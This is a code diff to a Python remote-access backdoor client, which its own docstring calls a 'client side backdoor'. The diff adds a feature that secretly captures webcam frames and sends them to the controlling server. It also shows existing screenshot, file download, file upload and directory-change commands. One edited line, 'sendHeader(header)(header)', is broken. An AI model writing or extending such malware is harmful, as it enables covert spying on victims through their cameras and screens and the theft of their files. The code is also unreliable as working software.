@@ -8,6 +8,7 @@ from socket import socket, AF_INET, SOCK_STREAM
 from getpass import getuser
 from datetime import datetime
 from pyscreenshot import grab
+from cv2 import VideoCapture, imencode
 from pathlib import Path
 from json import loads as jloads
 from pickle import loads, dumps
@@ -23,7 +24,7 @@ class Client(object):
     """ client side backdoor """
     def __init__(self, host='0.0.0.0', port=5000):
         self.__Address = (host, port)
-        self.screenshotPath = '/home/znairy/736f6e61726973.png'
+        self.webcamshotPath, self.screenshotPath = '/home/znairy/37962716e6f637.png','/home/znairy/736f6e61726973.png'
 
     def __repr__(self):
         print(f'Server(host="{self.__Address[0]}", port={self.__Address[1]})')
@@ -42,6 +43,33 @@ class Client(object):
         except PermissionError:
             self.sendHeader({"content": f"Permission denied: {args}", "sucess": False})
 
+    # taking a webcam shot
+    def webcamshot(self, args):
+        wcamshots = [VideoCapture(id).read()[1] for id in range(10) if VideoCapture(id).isOpened()] # trying to detect and get any frame from webcam
+
+        if wcamshots: # if exists any frame
+            data = [imencode('.png', frame)[1].tobytes() for frame in wcamshots] # "converting" all the frames to save
+            identifier = 0 if not args else int(args) - 1
+
+            try:
+                header = {
+                    "namefile": datetime.now().strftime('%d.%m.%y-%H.%M.%S'),
+                    "extension": '.png',
+                    "bytes": len(data[identifier]),
+                    "path": "screenshots",
+                    "numofcams": len(wcamshots),
+                    "sucess": True,
+                }
+
+                self.sendHeader(header)
+                sleep(0.5)
+                self.__Client.send(data[identifier])
+            
+            except IndexError:
+                self.sendHeader({"content": f"There's no webcam with ID {identifier+1}", "sucess": False})
+        else:
+            self.sendHeader({"content": f"There's no webcam available", "sucess": False})
+
     # taking a screenshot
     def screenshot(self, args):
         grab().save(self.screenshotPath) # taking and saving the screenshot
@@ -55,7 +83,7 @@ class Client(object):
             "path": "screenshots"
         }
 
-        self.__Client.send(dumps(header))
+        self.sendHeader(header)(header)
         sleep(1)
         self.__Client.send(file)
     
@@ -94,7 +122,7 @@ class Client(object):
             file += self.__Client.recv(header['bytes'])
 
         self.saveReceivedFile(f'{header["namefile"]}{header["extension"]}', file)
-
+    
     # returns name of file, extension and your bytes content
     def splitFile(self, path):
         with open(path, 'rb') as file:
@@ -121,6 +149,7 @@ class Client(object):
             "/screenshot": {"action": self.screenshot},
             "/download": {"action": self.download},
             "/upload": {"action": self.upload},
+            "/webcamshot": {"action": self.webcamshot},
             "cd": {"action":  self.changeDirectory}
         }
 
